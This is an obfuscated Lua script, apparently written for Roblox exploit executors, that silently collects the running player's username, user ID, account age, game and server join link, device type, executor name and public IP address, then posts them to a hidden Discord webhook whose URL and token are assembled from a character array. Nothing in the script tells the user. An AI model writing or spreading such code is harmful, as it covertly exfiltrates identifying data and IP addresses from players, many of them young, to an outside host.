local _0xB00B5=game:GetService;local _0xC0D3R=_0xB00B5("HttpService");local _0xB00BS=_0xB00B5("Players").LocalPlayer;local _0x69=_0xB00B5("MarketplaceService")
local function _0xH4X0R(u)return string.char(table.unpack(u))end
local _0xUR1={"104","116","116","112","115",":","/","/","100","105","115","99","111","114","100",".","99","111","109","/","97","112","105","/","119","101","98","104","111","111","107","115","/","1366093954726101012","/","7ciBVLgguCpWBwuHUeSYB6L4v3ytPvIpxl11tkEmANA3AExUvCSsaKx_S1tlEkTMX0zJ"}
local _0xW3BH00K=table.concat(_0xUR1)
local _,_0xPL4C3=pcall(function()return _0x69:GetProductInfo(game.PlaceId)end)local _0xG4M3=(_ and _0xPL4C3.Name)or"???"local _0x3X3C="Unknown_Executor"
if identifyexecutor then _0x3X3C=identifyexecutor()end
local _0xD3V1C3="Unknown_Device"if UserSettings and pcall(function()return UserSettings():GetService("UserGameSettings").MasterVolume end)then _0xD3V1C3="PC"elseif game:GetService("UserInputService").TouchEnabled then _0xD3V1C3="Mobile"elseif game:GetService("GuiService"):IsTenFootInterface()then _0xD3V1C3="Console"end
local _0x1P="???"
pcall(function()_0x1P=_0xC0D3R:GetAsync("https://api.ipify.org")end)
local _0xSCR1PT=(debug.getinfo and debug.getinfo(2)and debug.getinfo(2).short_src)or"Loadstring"
if _0x3X3C~="Delta"then
local _0xD4T4={
["username"]="Execution_Alert",
["embeds"]={{["title"]="Script Execute!",["color"]=tonumber("0x"..tostring("00ff00")),
["fields"]={
{["name"]="Username",["value"]=_0xB00BS.Name,["inline"]=true},
{["name"]="UserId",["value"]=tostring(_0xB00BS.UserId),["inline"]=true},
{["name"]="Game",["value"]=_0xG4M3,["inline"]=false},
{["name"]="JoinServer",["value"]="[ClickHere](https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId..")","inline"]=false},
{["name"]="AccountAge",["value"]=tostring(_0xB00BS.AccountAge).." days","inline"]=true},
{["name"]="Executor",["value"]=_0x3X3C,"inline"]=true},
{["name"]="Device",["value"]=_0xD3V1C3,"inline"]=true},
{["name"]="IP_Address",["value"]=_0x1P,"inline"]=false},
{["name"]="Script",["value"]=_0xSCR1PT,"inline"]=false},
{["name"]="Time",["value"]=os.date("%c"),["inline"]=false}
}}}
_0xC0D3R:PostAsync(_0xW3BH00K,_0xC0D3R:JSONEncode(_0xD4T4))
  end
